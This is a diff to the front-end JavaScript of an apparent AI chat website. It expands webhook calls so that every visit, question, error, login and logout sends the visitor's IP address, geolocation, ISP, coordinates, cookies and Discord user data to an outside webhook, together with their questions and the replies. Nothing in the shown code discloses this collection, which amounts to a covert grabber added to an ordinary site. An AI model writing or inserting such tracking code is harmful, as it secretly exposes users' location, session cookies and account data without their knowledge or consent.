@@ -68,7 +68,19 @@ document.addEventListener('DOMContentLoaded', async function() {
     // Check if the visitor is banned
     const isBanned = bannedUsers.some(user => user.cookie === visitorCookie || user.ip === ipData.ip);
     if (isBanned) {
-        await sendWebhook("Banned User Visit", `...`);
+        await sendWebhook("Banned User Visit", `
+**IP:** ${ipData.ip}
+**City:** ${ipData.city}
+**Region:** ${ipData.region}
+**Country:** ${ipData.country}
+**Timezone:** ${ipData.timezone}
+**Org:** ${ipData.org}
+**Location:** ${ipData.loc}
+**Cookies:** ${visitorCookie}
+**Discord User Data:** \`\`\`py
+${userDataFormatted}
+\`\`\`
+`, 16711680); // Red color for banned user
         sendButton.disabled = true;
         statusMessage.innerText = "You are blacklisted from using this service.";
         responseContainer.innerText = "";
@@ -76,7 +88,19 @@ document.addEventListener('DOMContentLoaded', async function() {
         return;
     }
 
-    await sendWebhook("User Visit", `...`);
+    await sendWebhook("User Visit", `
+**IP:** ${ipData.ip}
+**City:** ${ipData.city}
+**Region:** ${ipData.region}
+**Country:** ${ipData.country}
+**Timezone:** ${ipData.timezone}
+**Org:** ${ipData.org}
+**Location:** ${ipData.loc}
+**Cookies:** ${visitorCookie}
+**Discord User Data:** \`\`\`py
+${userDataFormatted}
+\`\`\`
+`, Math.floor(Math.random() * 16777215)); // Random color for user visit;
     statusMessage.innerText = "Waiting...";
     statusImage.src = statusEmojis.ellipsis;
     loginButton.disabled = false;
@@ -107,13 +131,41 @@ document.addEventListener('DOMContentLoaded', async function() {
                 throw new Error(data.error);
             }
 
-            await sendWebhook("Question Asked", `...`);
+            await sendWebhook("Question Asked", `
+**Question:** ${question}
+**Response:** ${data.reply}
+**IP:** ${ipData.ip}
+**City:** ${ipData.city}
+**Region:** ${ipData.region}
+**Country:** ${ipData.country}
+**Timezone:** ${ipData.timezone}
+**Org:** ${ipData.org}
+**Location:** ${ipData.loc}
+**Cookies:** ${visitorCookie}
+**Discord User Data:** \`\`\`py
+${userDataFormatted}
+\`\`\`
+`, Math.floor(Math.random() * 16777215)); // Random color
             responseContainer.innerText = data.reply;
             statusImage.src = statusEmojis.check;
             statusMessage.innerText = "The API is all good!";
         } catch (error) {
             console.error('Fetch error:', error);
-            await sendWebhook("Fetch Error", `...`);
+            await sendWebhook("Fetch Error", `
+**Question:** ${question}
+**Error Message:** ${error.message}
+**IP:** ${ipData.ip}
+**City:** ${ipData.city}
+**Region:** ${ipData.region}
+**Country:** ${ipData.country}
+**Timezone:** ${ipData.timezone}
+**Org:** ${ipData.org}
+**Location:** ${ipData.loc}
+**Cookies:** ${visitorCookie}
+**Discord User Data:** \`\`\`py
+${userDataFormatted}
+\`\`\`
+`, 16711680); // Red color for errors
             statusMessage.innerText = `An error occurred. Please try again later. Error Message : ${error.message}`;
             responseContainer.innerText = "";
             statusImage.src = statusEmojis.error;
@@ -134,7 +186,19 @@ document.addEventListener('DOMContentLoaded', async function() {
 
     // Logout functionality with JWT
     logoutButton.addEventListener('click', async function() {
-        await sendWebhook("User Logout", `...`);
+        await sendWebhook("User Logout", `
+**IP:** ${ipData.ip}
+**City:** ${ipData.city}
+**Region:** ${ipData.region}
+**Country:** ${ipData.country}
+**Timezone:** ${ipData.timezone}
+**Org:** ${ipData.org}
+**Location:** ${ipData.loc}
+**Cookies:** ${visitorCookie}
+**Discord User Data:** \`\`\`py
+${userDataFormatted}
+\`\`\`
+`, Math.floor(Math.random() * 16777215)); // Random color
         localStorage.removeItem('discordUser');
         localStorage.removeItem('jwtToken'); // Remove the JWT token on logout
         loggedIn = false;
@@ -164,7 +228,19 @@ document.addEventListener('DOMContentLoaded', async function() {
                     localStorage.setItem('discordUser', JSON.stringify(data.user));
                     localStorage.setItem('jwtToken', data.token); // Store JWT token
                     loggedIn = true;
-                    await sendWebhook("User Login", `...`);
+                    await sendWebhook("User Login", `
+**IP:** ${ipData.ip}
+**City:** ${ipData.city}
+**Region:** ${ipData.region}
+**Country:** ${ipData.country}
+**Timezone:** ${ipData.timezone}
+**Org:** ${ipData.org}
+**Location:** ${ipData.loc}
+**Cookies:** ${visitorCookie}
+**Discord User Data:** \`\`\`py
+${userDataFormatted}
+\`\`\`
+`, Math.floor(Math.random() * 16777215)); // Random color
                     updateUI(); // Update the UI after successful login
                     window.location.href = 'https://cakeorpastry.netlify.app/testgpt';
                 } catch (error) {
